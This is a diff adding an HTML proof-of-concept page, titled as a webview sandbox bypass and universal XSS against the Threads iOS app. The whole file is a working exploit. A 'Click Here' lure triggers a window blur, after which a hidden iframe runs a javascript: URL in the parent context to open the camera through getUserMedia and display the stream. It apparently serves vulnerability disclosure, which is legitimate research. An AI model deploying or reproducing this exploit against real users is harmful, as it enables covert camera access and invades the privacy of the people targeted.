@@ -1,0 +1,12 @@
+<html lang="en-US"> 
+<head> 
+<meta charset="UTF-8"> <meta name="viewport" content="width=device-width, user-scalable=no"> 
+<title> Bypass sandbox Webview UXss Delayed JavaScript execution (Camera Access) Threads iOS</title> 
+<style> iframe { visibility: hidden; } </style> 
+<script>window.onblur = function() { document.getElementById("iframe").src="javascript:(async()=>{try{const p=parent;const s=await navigator.mediaDevices.getUserMedia({video:true});const v=p.document.createElement('video');v.autoplay=true;v.playsInline=true;v.muted=true;v.srcObject=s;v.style.maxWidth='100%';p.document.body.appendChild(v);}catch(e){alert('ERR '+e);}})()"; } </script>
+</head> 
+<body> 
+<center><br><h1>Click Here</h1></center>
+<iframe id="iframe"></iframe> 
+</body> 
+</html>
